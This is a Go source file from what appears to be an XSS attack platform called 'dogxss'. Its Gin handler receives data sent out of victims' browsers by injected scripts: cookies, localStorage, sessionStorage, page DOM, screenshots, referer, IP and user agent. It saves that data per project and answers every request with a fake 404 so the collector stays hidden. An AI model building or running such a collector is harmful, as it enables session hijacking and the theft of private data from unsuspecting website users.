package dog

import (
	"dogxss/payload"
	"fmt"
	"github.com/gin-gonic/gin"
	"strings"
	"time"
)

type RetPayLoad struct {
	Url          string `json:"uri,omitempty"`
	Cookies      string `json:"cookies"`
	Referer      string `json:"referer"`
	Origin       string `json:"origin"`
	Localstorage struct {
	} `json:"localstorage"`
	SessionStorage struct {
	} `json:"sessionstorage"`
	Dom        string `json:"dom,omitempty"`
	Uuid       string `json:"uuid,omitempty"`
	Screenshot string `json:"screenshot"`
}

// ReturnPayLoad 返回的信息
func ReturnPayLoad(c *gin.Context) {
	projectid := c.GetHeader("Content-Time") //获取项目id
	if projectid == "" {
		c.String(404, "404 page not found")
		return
	} else {
		json2 := make(map[string]interface{})
		//json := RetPayLoad{}
		err := c.BindJSON(&json2)
		if err != nil {
			fmt.Println(err)
			c.String(404, "404 page not found")
			return
		}
		//url:=fmt.Sprintf("%s",json2["uri"])
		if payload.AuthProJect(projectid) { //如果存在就写入
			info := payload.ProjectReturn{}
			Localstorage := fmt.Sprintf("%s", json2["localstorage"])
			Localstorage = strings.Replace(Localstorage, "map[", "", -1)
			Localstorage = strings.Replace(Localstorage, "]", "", -1)
			Localstorage = strings.Replace(Localstorage, " ", "\n", -1)
			SessionStorage := fmt.Sprintf("%s", json2["sessionstorage"])
			SessionStorage = strings.Replace(SessionStorage, "map[", "", -1)
			SessionStorage = strings.Replace(SessionStorage, "]", "", -1)
			SessionStorage = strings.Replace(SessionStorage, " ", "\n", -1)
			info.ReturnUrl = fmt.Sprintf("%s", json2["uri"])
			info.ReturnDom = fmt.Sprintf("%s", json2["dom"])
			info.ReturnLocalStorge = Localstorage
			info.ReturnTime = time.Now().Format("2006-01-02 15:04:05") //获取当前时间
			info.ReturnSessionStorage = SessionStorage
			info.ReturnScreenShort = fmt.Sprintf("%s", json2["screenshot"])
			info.ProjectId = projectid
			info.Ip = c.ClientIP()
			info.ReturnCookie = fmt.Sprintf("%s", json2["cookies"])
			info.ReturnUserAgent = c.GetHeader("User-Agent")
			info.ReturnOrigin = fmt.Sprintf("%s", json2["origin"])
			info.ReturnReferer = fmt.Sprintf("%s", json2["referer"])
			payload.AddInfo(info)
			//fmt.Println("收到请求.")
			c.String(404, "404 page not found")
			return
		} else {
			c.String(404, "404 page not found")
			return
		}
		c.String(404, "404 page not found")
		return
	}

}
